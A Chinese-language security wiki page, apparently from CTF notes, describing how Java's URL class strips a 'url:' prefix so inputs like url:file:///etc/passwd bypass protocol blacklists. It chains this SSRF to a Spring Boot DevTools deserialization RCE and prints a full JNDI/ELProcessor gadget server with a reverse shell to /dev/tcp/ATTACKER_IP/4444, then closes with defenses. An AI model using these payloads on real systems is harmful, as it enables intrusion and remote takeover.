---
title: Java URLConnection `url:` 前缀解析绕过协议黑名单实现 SSRF 任意文件读取
description: 记录 Java URLConnection 在解析 URL 时自动识别并剥离 `url:` 前缀的特性，攻击者可利用此特性绕过基于协议前缀的黑名单校验（如
  file、jar、ftp 等），将原本的 HTTP/HTTPS SSRF 转化为任意文件读取漏洞。结合 Spring Boot DevTools 弱默认密钥导致的反序列化
  RCE 利用链进行实战复现。
category: ai-security
tags:
- Java
- URLConnection
- SSRF
- Protocol Bypass
- Spring Boot DevTools
- Deserialization
- JNDI Injection
- CTF
date: '2021-04-15'
updated: '2026-11-12'
---
## 核心原理：`url:` 前缀被 URL 类静默剥离

Java `java.net.URL` 在构造函数 `URL(URL context, String spec, URLStreamHandler handler)` 中，会对传入的 `spec` 字符串进行预处理。若字符串以 `url:`（不区分大小写）开头，解析器会将起始偏移量 `start` 直接加 4，随后按常规逻辑提取协议名（冒号前的字符串）并查找对应的 `URLStreamHandler`。

```java
// JDK 源码片段 (java/net/URL.java)
if (spec.regionMatches(true, start, "url:", 0, 4)) {
    start += 4;   // 直接跳过 "url:"
}
// 后续循环从 start 位置提取协议名直到遇到 ':'
for (i = start; !aRef && (i < limit) && ((c = spec.charAt(i)) != '/'); i++) {
    if (c == ':') {
        String s = spec.substring(start, i).toLowerCase();
        if (isValidProtocol(s)) { newProtocol = s; start = i + 1; }
        break;
    }
}
```

**利用效果**：  
原始输入 `url:file:///etc/passwd` → 校验阶段看到前缀 `url:` 而非 `file:` → 绕过 `^[file|jar|ftp|...]` 黑名单正则 → 实际连接阶段由 `URL` 类解析为 `file` 协议 → 实现任意文件读取。

## 典型漏洞场景：Spring Boot 接口 + 黑名单校验

```java
@ResponseBody
@GetMapping("/pathneverguess")
public String ping(@RequestParam String url) {
    return PingUtil.ping(url);
}

static String ping(String urlString) {
    if (validate(cleanUrl(urlString))) {          // 黑名单正则：^[file|netdoc|jar|ftp|mailto]
        URL url = new URL(urlString);             // 此处触发 url: 前缀剥离
        URLConnection conn = url.openConnection();
        // ... 读取并返回响应体
    }
    return "please buy me a Java XD";
}
```

| 输入示例 | 校验阶段看到的前缀 | 实际解析协议 | 结果 |
|----------|-------------------|--------------|------|
| `http://evil.com` | `http:` | `http` | 正常 SSRF |
| `file:///etc/passwd` | `file:` → **拦截** | - | 被黑名单阻断 |
| `url:file:///etc/passwd` | `url:` → **通过** | `file` | **任意文件读取** |
| `url:jar:file:///app/app.jar!/META-INF/MANIFEST.MF` | `url:` → **通过** | `jar` | JAR 包任意文件读取 |

## 实战扩展链：SSRF → 环境变量泄露 → DevTools 反序列化 RCE

### 读取 `/proc/self/environ` 发现弱配置
利用上述 `url:file:///proc/self/environ` 读取进程环境变量，常见泄露：
- `SPRING_DEVTOOLS_REMOTE_SECRET=myscret`（默认弱口令）
- `JAVA_VERSION=1.8.0_265`（高版本 JDK，需绕过 JNDI 限制）

### Spring Boot DevTools 远程重启端点反序列化
DevTools 暴露 `/restart` 端点（默认路径），接受序列化的 `ClassLoaderFiles` 对象：
```java
// org.springframework.boot.devtools.restart.server.HttpRestartServer
ObjectInputStream ois = new ObjectInputStream(request.getBody());
ClassLoaderFiles files = (ClassLoaderFiles) ois.readObject();  // 任意反序列化
```
鉴权仅需 Header `X-AUTH-TOKEN: <secret>`，默认 `myscret` 常被遗漏修改。

### 高版本 JDK (8u265+) JNDI 注入利用链
依赖环境：`spring-tx` + `tomcat-embed-core`（目标项目均存在）

```
JtaTransactionManager.setUserTransactionName("rmi://attacker/Object")
        → InitialContext.lookup()
        → 攻击者 RMI 服务返回 ReferenceWrapper(ResourceRef)
        → BeanFactory.getObjectInstance()
        → ELProcessor.eval("恶意 JS 代码")
        → Runtime.exec()/ProcessBuilder 执行命令
```

**关键 Gadget 组合**  
| 组件 | 版本要求 | 作用 |
|------|----------|------|
| `org.springframework.transaction.jta.JtaTransactionManager` | spring-tx ≥ 5.2 | 触发 JNDI lookup |
| `org.apache.naming.factory.BeanFactory` | tomcat-embed-core ≥ 9.0 | 处理 ResourceRef 实例化 ELProcessor |
| `javax.el.ELProcessor` | JDK 8 内置 | 执行任意表达式/脚本 |

### 攻击者 RMI 服务端示例
```java
System.setProperty("java.rmi.server.hostname", "ATTACKER_IP");
Registry reg = LocateRegistry.createRegistry(1099);
ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,
        "org.apache.naming.factory.BeanFactory", null);
ref.add(new StringRefAddr("forceString", "x=eval"));
ref.add(new StringRefAddr("x",
        "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
        ".newInstance().getEngineByName(\"JavaScript\")" +
        ".eval(\"new java.lang.ProcessBuilder['(java.lang.String[])']" +
        "(['/bin/bash','-c','bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1']).start()\")"));
reg.bind("Object", new ReferenceWrapper(ref));
```

## 防御与修复建议

| 层面 | 措施 |
|------|------|
| **代码层** | 使用白名单校验协议（仅允许 `http`/`https`），而非黑名单；调用 `URL` 前先手动 `spec = spec.replaceFirst("(?i)^url:", "")` 或使用 `URI` 类严格解析。 |
| **配置层** | 禁用 `spring-boot-devtools` 生产环境依赖；若必须保留，强制设置高强度 `spring.devtools.remote.secret` 并限制 `/restart` 端点网络访问（仅本地回环）。 |
| **JDK 层** | 升级至 JDK 8u191+ / 11.0.1+ / 12.0.1+，默认开启 `com.sun.jndi.rmi.object.trustURLCodebase=false` 与 `com.sun.jndi.ldap.object.trustURLCodebase=false` 阻断远程类加载。 |
| **网络层** | 出口防火墙限制应用服务器仅能访问必要的外部 HTTP/HTTPS 目标，禁止主动发起 RMI/LDAP 连接。 |

## 关联知识页面

- [[spring-boot-devtools-deserialization-rce]] — Spring Boot DevTools 弱默认密钥导致的反序列化 RCE 完整利用链分析
- [[java-deserialization-fundamentals]] — Java 序列化/反序列化核心机制基础
- [[spring-boot-actuator配置不当rce利用]] — Actuator 端点暴露结合 H2/JNDI/XStream 等多条 RCE 链
- [[h2-console-jndi注入rce利用]] — H2 Console 未授权访问 + JNDI 注入 RCE 复现
- [[spring-cloud-config目录穿越漏洞]] — Spring Cloud Config 双重编码绕过目录穿越读取任意文件

## 小结

Java `URLConnection` 对 `url:` 前缀的兼容性处理，配合开发者常见的「协议前缀黑名单」校验逻辑，形成一类隐蔽且高危的 **SSRF 绕过 → 任意文件读取** 漏洞模式。在 Spring Boot 生态中，该漏洞常作为**信息收集入口**（读取环境变量、配置文件），进而结合 DevTools 弱口令反序列化、Actuator 端点滥用等后利用链实现 **RCE 全链路打击**。防御核心在于：**白名单校验协议、最小化暴露调试端点、升级 JDK 并开启 JNDI 远程加载防护**。

## 来源

- [0th3rs安全团队-201911-202204_058](../sources/0th3rs安全团队-201911-202204_058.md)
